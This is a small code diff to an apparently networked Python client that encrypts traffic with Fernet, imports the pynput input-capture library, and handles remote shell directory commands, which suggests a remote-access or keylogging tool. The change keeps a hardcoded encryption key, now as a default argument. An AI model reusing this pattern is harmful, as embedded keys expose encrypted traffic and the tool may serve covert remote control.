@@ -179,11 +179,11 @@ if _pynput:
 
 class Client(object):
 
-    def __init__(self, host='127.0.0.1', port=8000) -> None:
+    def __init__(self, host='127.0.0.1', port=8000, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
         self.serverHost = host
         self.serverPort = port
         self.socket = None
-        self.Fer = Fernet(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
+        self.Fer = Fernet(key)
         if platform.system() == 'Windows':
             self._pwd = ' & cd'
         else:
